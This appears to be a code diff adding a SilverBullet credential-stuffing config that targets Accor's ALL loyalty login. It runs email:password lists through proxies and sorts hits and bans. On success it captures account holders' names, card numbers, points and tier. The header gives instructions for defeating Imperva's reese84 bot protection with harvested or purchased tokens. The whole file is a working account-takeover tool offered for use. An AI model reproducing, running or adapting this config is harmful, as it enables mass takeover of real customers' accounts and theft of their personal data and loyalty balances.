@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+╔════════════════════════════════════════════════════════════════════════╗
+║   AKAZA  ACCOR  CHECKER  —  SilverBullet  config  (.svb)               ║
+║   Version: 1.0                                                          ║
+║   Telegram: @akaza_isnt                                                 ║
+╠════════════════════════════════════════════════════════════════════════╣
+║                                                                         ║
+║  HOW TO USE                                                             ║
+║  ──────────                                                             ║
+║   1.  Open SilverBullet  ->  Configs  ->  Import.                       ║
+║   2.  Pick this file (Accor_Akaza.svb).                                 ║
+║   3.  Wordlist type: "Email:Pass".                                      ║
+║   4.  Hit Run.                                                          ║
+║                                                                         ║
+║  ⚠  IMPERVA WARNING  ⚠                                                  ║
+║  ──────────────────                                                     ║
+║   all.accor.com / login.accor.com are protected by Imperva (reese84).   ║
+║   Every request needs a valid `reese84` cookie produced by ~700 KB of   ║
+║   obfuscated JavaScript running in a real browser.                      ║
+║                                                                         ║
+║   Vanilla SilverBullet has NO JS engine, so without ONE of the          ║
+║   following this config will get banned (403/412) on the very first    ║
+║   request:                                                              ║
+║                                                                         ║
+║     (a) SilverBullet's Puppeteer/Selenium plugin to harvest a fresh     ║
+║         reese84 cookie and inject it before request #1.                 ║
+║     (b) An external token-harvester service (some communities sell     ║
+║         reese84 tokens via API).                                        ║
+║     (c) A reese84 cookie copied from a real browser pasted into the     ║
+║         "reese84_token" Constant near the top of the script - these    ║
+║         tokens expire in minutes so you'll only catch a few combos.    ║
+║                                                                         ║
+║   For most users, the Python+Playwright version in this repo            ║
+║   ("accor akaza.py") is faster IN PRACTICE because it solves reese84    ║
+║   automatically. Ask if you want concurrent bots added there for a      ║
+║   real-world 5-10x speedup.                                             ║
+║                                                                         ║
+╚════════════════════════════════════════════════════════════════════════╝
+-->
+<ConfigSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Name>Accor Akaza</Name>
+  <Author>Akaza (@akaza_isnt)</Author>
+  <Version>1.0</Version>
+  <AdditionalInfo>Accor ALL credential checker. Captures Name / Tier / Points / Card / Nights. Requires reese84 token to bypass Imperva - see header comment.</AdditionalInfo>
+
+  <!-- Runtime tuning -->
+  <SuggestedBots>25</SuggestedBots>
+  <MaxCPM>0</MaxCPM>
+  <NeedsProxies>true</NeedsProxies>
+  <OnlySocks>false</OnlySocks>
+  <OnlySsl>false</OnlySsl>
+  <MaxProxyUses>5</MaxProxyUses>
+
+  <!-- Hit-saving rules -->
+  <SaveHits>true</SaveHits>
+  <SaveCustom>true</SaveCustom>
+  <SaveEmpty>false</SaveEmpty>
+  <ContinueOnCustom>false</ContinueOnCustom>
+
+  <!-- Wordlist filter: only run on email-style lists -->
+  <AllowedWordlist1>Email</AllowedWordlist1>
+  <AllowedWordlist2>EmailPass</AllowedWordlist2>
+
+  <DataRules />
+  <CustomInputs />
+
+  <Script>
+    <![CDATA[
+; ─── Step 0 ── Optional: paste a fresh reese84 cookie here ──────────────
+; Capture from any real browser: DevTools -> Application -> Cookies ->
+;   .accor.com -> reese84 -> copy the value.
+; If left blank the script will be banned by Imperva on step 1.
+FUNCTION Constant "" -> VAR "reese84_token"
+
+
+; ─── Step 1 ── Hit the homepage to populate the cookie jar ──────────────
+; Imperva inspects this request hardest. Without a valid reese84 cookie
+; you get 403/412 and the rest never runs.
+REQUEST GET "https://all.accor.com/a/en.html"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Sec-Fetch-Dest: document"
+  HEADER "Sec-Fetch-Mode: navigate"
+  HEADER "Sec-Fetch-Site: none"
+  HEADER "Sec-Fetch-User: ?1"
+  HEADER "Upgrade-Insecure-Requests: 1"
+  COOKIE "reese84=<reese84_token>"
+
+KEYCHECK
+  KEYCHAIN BAN OR
+    KEY "<RESPONSECODE>" = "403"
+    KEY "<RESPONSECODE>" = "412"
+    KEY "<SOURCE>" Contains "Imperva"
+    KEY "<SOURCE>" Contains "reese84"
+
+
+; ─── Step 2 ── Submit email - does this account exist? ─────────────────
+REQUEST POST "https://login.accor.com/api/v2/authentication/login"
+  CONTENT "{\"email\":\"<USER>\"}"
+  CONTENTTYPE "application/json"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: application/json, text/plain, */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Origin: https://login.accor.com"
+  HEADER "Referer: https://login.accor.com/"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+
+KEYCHECK
+  KEYCHAIN BAN OR
+    KEY "<RESPONSECODE>" = "403"
+    KEY "<RESPONSECODE>" = "412"
+    KEY "<RESPONSECODE>" = "429"
+    KEY "<SOURCE>" Contains "Imperva"
+    KEY "<SOURCE>" Contains "captcha"
+  KEYCHAIN CUSTOM "ACC_NOT_REGISTERED" OR
+    KEY "<SOURCE>" Contains "ACCOUNT_NOT_FOUND"
+    KEY "<SOURCE>" Contains "create_account"
+    KEY "<SOURCE>" Contains "createAccount"
+
+
+; ─── Step 3 ── Submit the password ──────────────────────────────────────
+REQUEST POST "https://login.accor.com/api/v2/authentication/password"
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}"
+  CONTENTTYPE "application/json"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: application/json, text/plain, */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Origin: https://login.accor.com"
+  HEADER "Referer: https://login.accor.com/"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+
+KEYCHECK
+  KEYCHAIN BAN OR
+    KEY "<RESPONSECODE>" = "403"
+    KEY "<RESPONSECODE>" = "412"
+    KEY "<SOURCE>" Contains "Imperva"
+  KEYCHAIN FAILURE OR
+    KEY "<SOURCE>" Contains "invalid_password"
+    KEY "<SOURCE>" Contains "INVALID_PASSWORD"
+    KEY "<SOURCE>" Contains "wrong password"
+  KEYCHAIN RETRY OR
+    KEY "<SOURCE>" Contains "locked"
+    KEY "<SOURCE>" Contains "too_many_attempts"
+  KEYCHAIN SUCCESS OR
+    KEY "<SOURCE>" Contains "access_token"
+    KEY "<SOURCE>" Contains "redirect_uri"
+    KEY "<RESPONSECODE>" = "200"
+
+
+; ─── Step 4 ── Extract the bearer token from the success response ───────
+PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" CreateEmpty=False -> VAR "TOKEN"
+
+
+; ─── Step 5 ── Fetch the customer profile + loyalty data ────────────────
+REQUEST GET "https://api.accor.com/customer/v3/individuals/me?fields=loyalty,individual"
+  HEADER "Authorization: Bearer <TOKEN>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: application/json, text/plain, */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Origin: https://all.accor.com"
+  HEADER "Referer: https://all.accor.com/"
+
+
+; ─── Step 6 ── Capture all the goodies ──────────────────────────────────
+; First name + last name -> joined into one capture
+PARSE "<SOURCE>" LR "\"firstName\":\"" "\"" CreateEmpty=True -> VAR "first"
+PARSE "<SOURCE>" LR "\"lastName\":\"" "\""  CreateEmpty=True -> VAR "last"
+FUNCTION Constant "<first> <last>" -> CAP "Name"
+
+; Reward points balance
+PARSE "<SOURCE>" LR "\"nbPoints\":" "," CreateEmpty=True -> CAP "Points"
+
+; Nights balance
+PARSE "<SOURCE>" LR "\"currentNightsBalance\":" "," CreateEmpty=True -> CAP "Nights"
+
+; Card number
+PARSE "<SOURCE>" LR "\"cardNumber\":\"" "\"" CreateEmpty=True -> CAP "Card"
+
+; Tier code (A1..A6) -> human-readable tier name
+PARSE "<SOURCE>" LR "\"cardCodeTARS\":\"" "\"" CreateEmpty=True -> VAR "tierCode"
+FUNCTION Translate "<tierCode>" Translations="A1=Classic|A2=Silver|A3=Gold|A4=Platinum|A5=Diamond|A6=Limitless" -> CAP "Tier"
+    ]]>
+  </Script>
+</ConfigSettings>
